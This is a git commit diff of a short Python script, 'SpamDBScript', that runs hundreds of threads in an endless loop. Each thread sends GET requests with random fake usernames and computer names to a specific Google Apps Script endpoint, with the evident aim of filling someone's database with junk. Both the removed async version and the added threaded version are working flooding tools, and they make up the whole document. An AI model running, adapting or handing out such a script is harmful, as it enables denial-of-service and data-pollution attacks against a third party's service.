77b853906912f543662e700854507a970bfeca1d
pom <support@pomsaddons.xyz>
2025-06-09 21:42:54 -0400

    Revert for compatibility

--- SpamDBScript/main.py
+++ SpamDBScript/main.py
@@ -1,36 +1,35 @@
-print("script made by msgpack on discord, optimized by pom")
+print("script made by msgpack on discord")
 
-import asyncio
-import httpx
+import requests
+import urllib.parse
+import os
 import random
 import string
-
-def generate_id(length=5):
+import threading
+def INDIAUP(length=5):
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
-async def send_request(client):
-    while True:
-        username = f"FillTheDbUP_{generate_id()}"
-        computer = f"CRACKEDLMAO_{generate_id()}"
-        params = {
-            'username': username,
-            'computer': computer
-        }
-        try:
-            r = await client.get(
-                "https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec",
-                params=params,
-                timeout=10
-            )
-            if r.status_code == 200:
-                print("done", r.text)
-        except httpx.RequestError:
-            pass
+def boom():
+  while True:
+    username = f"FillTheDbUP_{INDIAUP()}"
+    compName = f"CRACKEDLMAO_{INDIAUP()}"
+    encodedUser = urllib.parse.quote(username)
+    encodedPC = urllib.parse.quote(compName)
+    fullURL = f"https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec?username={encodedUser}&computer={encodedPC}"
+    response = requests.get(fullURL)
+    if response.status_code == 200:
+        print("done", response.text)
+    else:
+      pass
 
-async def main(concurrency=1000):
-    async with httpx.AsyncClient() as client:
-        tasks = [send_request(client) for _ in range(concurrency)]
-        await asyncio.gather(*tasks)
+def sigmarizzler(num_threads=10):
+    threads = []
 
-asyncio.run(main())
+    for _ in range(num_threads):
+        thread = threading.Thread(target=boom)
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
 
+sigmarizzler(500)
